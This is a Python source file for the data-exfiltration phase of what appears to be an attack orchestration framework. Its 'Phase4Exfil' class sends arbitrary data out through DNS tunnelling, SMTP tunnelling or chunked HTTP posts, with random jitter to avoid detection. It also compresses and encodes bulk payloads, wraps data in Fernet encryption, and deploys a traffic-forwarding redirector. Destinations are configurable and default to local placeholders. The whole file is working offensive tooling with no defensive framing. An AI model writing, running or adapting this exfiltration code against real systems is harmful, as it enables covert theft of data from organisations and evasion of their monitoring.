import asyncio, sys, os, json, zlib, base64, time, random
sys.path.insert(0, "/raphael")

from cryptography.fernet import Fernet
from orchestrator.exfil.dns_tunnel import DNSTunnel
from orchestrator.exfil.smtp_tunnel import SMTPTunnel
from orchestrator.exfil.bulk_exfil import BulkExfil
from orchestrator.exfil.bounceback import BounceBack


class Phase4Exfil:
    def __init__(self, data: str, method: str = "dns", dns_domain: str = None,
                 smtp_server: str = None, http_endpoint: str = None,
                 recipient: str = None):
        self.data = data
        self.method = method
        self.dns_domain = dns_domain
        self.smtp_server = smtp_server
        self.http_endpoint = http_endpoint
        self.recipient = recipient

    async def run(self) -> dict:
        try:
            if self.method == "dns":
                res = self._dns_exfil(self.data)
            elif self.method == "smtp":
                res = self._smtp_exfil(self.data, self.recipient)
            elif self.method == "http":
                res = self._http_exfil(self.data, self.http_endpoint)
            elif self.method == "bounceback":
                res = self._bounceback(self.http_endpoint or "127.0.0.1", 443)
            elif self.method == "bulk":
                res = self._bulk_exfil(self.data)
            elif self.method == "encrypt":
                res = self._encrypt_envelope(self.data)
            else:
                res = self._dns_exfil(self.data)
            res["summary"] = self._summarize(res)
            res["status"] = res.get("status", "complete")
            return res
        except Exception as e:
            return {"method": self.method, "status": "error", "error": str(e),
                    "summary": self._summarize({})}

    def _dns_exfil(self, data: str, chunk_size: int = 32, jitter: tuple = (0.5, 2.0)) -> dict:
        tunnel = DNSTunnel(self.dns_domain or "exfil.local")
        res = tunnel.exfil(data, chunk_size, jitter)
        return {
            "method": "dns",
            "data_size": len(data),
            "chunks": res.get("total_chunks", 0),
            "destination": self.dns_domain,
            "status": "complete" if res.get("failed", 0) == 0 else "partial",
            "details": res,
        }

    def _smtp_exfil(self, data: str, recipient: str = None,
                    chunk_size: int = 512, jitter: tuple = (1.0, 5.0)) -> dict:
        tunnel = SMTPTunnel(self.smtp_server or "localhost", 25)
        rcpt = recipient or self.recipient or "exfil@localhost"
        res = tunnel.exfil(data, rcpt, chunk_size=chunk_size, jitter=jitter)
        return {
            "method": "smtp",
            "data_size": len(data),
            "chunks": res.get("total_chunks", 0),
            "destination": rcpt,
            "status": "complete" if res.get("failed", 0) == 0 else "partial",
            "details": res,
        }

    def _http_exfil(self, data: str, endpoint: str = None,
                    chunk_size: int = 1048576, jitter: tuple = (0.1, 0.3)) -> dict:
        ep = endpoint or self.http_endpoint or "http://localhost:8080/exfil"
        bulk = BulkExfil(ep)
        res = asyncio.run(bulk.exfil(data, chunk_size, jitter))
        return {
            "method": "http",
            "data_size": len(data),
            "chunks": res.get("total_chunks", 0),
            "destination": ep,
            "status": "complete" if res.get("failed", 0) == 0 else "partial",
            "details": res,
        }

    def _bounceback(self, forward_host: str, forward_port: int) -> dict:
        bb = BounceBack()
        res = bb.deploy(8443, forward_host, forward_port)
        return {
            "method": "bounceback",
            "data_size": 0,
            "chunks": 0,
            "destination": f"{forward_host}:{forward_port}",
            "status": res.get("status", "unknown"),
            "details": res,
        }

    def _bulk_exfil(self, data: str, chunk_size: int = 1048576) -> dict:
        compressed = zlib.compress(data.encode())
        raw = compressed
        chunks = [raw[i:i+chunk_size] for i in range(0, len(raw), chunk_size)]
        ep = self.http_endpoint or "http://localhost:8080/exfil"
        bulk = BulkExfil(ep)
        encoded_chunks = [base64.b64encode(c).decode() for c in chunks]
        res = asyncio.run(bulk.exfil("\n".join(encoded_chunks), chunk_size, (0.1, 0.3)))
        return {
            "method": "bulk",
            "data_size": len(data),
            "compressed_size": len(compressed),
            "chunks": len(chunks),
            "destination": ep,
            "status": "complete" if res.get("failed", 0) == 0 else "partial",
            "details": res,
        }

    def _encrypt_envelope(self, data: str) -> dict:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(data.encode())
        return {
            "method": "encrypt",
            "data_size": len(data),
            "encrypted_size": len(encrypted),
            "chunks": 0,
            "destination": "envelope",
            "status": "complete",
            "fernet_key": key.decode(),
            "payload": base64.b64encode(encrypted).decode(),
            "details": {"algorithm": "Fernet (AES-128-CBC + HMAC-SHA256)"},
        }

    def _summarize(self, results: dict) -> dict:
        return {
            "method": results.get("method", self.method),
            "data_size": results.get("data_size", len(self.data)),
            "chunks": results.get("chunks", 0),
            "destination": results.get("destination", "unknown"),
            "status": results.get("status", "unknown"),
        }
